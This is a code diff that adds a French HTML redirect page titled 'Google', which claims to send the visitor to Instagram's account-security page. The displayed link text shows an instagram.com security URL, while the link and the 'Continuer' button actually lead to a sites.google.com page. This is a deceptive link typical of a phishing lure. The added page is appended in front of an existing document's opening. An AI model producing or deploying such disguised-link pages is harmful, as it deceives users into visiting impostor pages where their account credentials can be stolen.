@@ -3,6 +3,92 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Nettoyage du corps pour le style minimal */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7; /* Léger gris de fond */
+            display: flex; /* Centrage de la boîte */
+            justify-content: left;
+            align-items: center;
+
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Style de la boîte de connexion/redirection (simple) */
+        .login-box {
+
+        }
+
+        /* Style du bouton "Continuer" simple */
+        .button-primary {
+            background-color: #1a73e8; /* Bleu primaire */
+            color: #ffffff;
+            font-weight: 500;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 15px; /* Espace après le lien */
+        }
+
+        .button-primary:hover {
+            background-color: #1669c5;
+        }
+
+        /* Style pour l'URL */
+        .redirect-link {
+            word-break: break-all;
+            color: #1a73e8;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 5px; /* Pour remplacer le <br><br> */
+        }
+
+        /* Style pour le paragraphe */
+        p {
+            margin-bottom: 20px;
+        }
+
+        /* Supprimer les styles non pertinents pour la redirection simple */
+        html, body {
+            height: auto;
+            overflow: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <h1 class="text-xl mb-4 text-gray-700">Redirection</h1>
+
+        <p>Vous allez être redirigé vers <strong>instagram</strong>. Cliquez sur continuer pour poursuivre...</p>
+
+        <div class="redirect-link">
+            <a href="https://sites.google.com/view/redirect-instagram" target="_blank">
+                https://www.instagram.com/accounts/security
+            </a>
+        </div>
+
+        <div class="">
+            <a href="https://sites.google.com/view/redirect-instagram" target="_blank">
+                <button type="submit" class="button-primary">Continuer</button>
+            </a>
+        </div>
+    </div>
+
+</body>
+</html><!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Redirection - Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
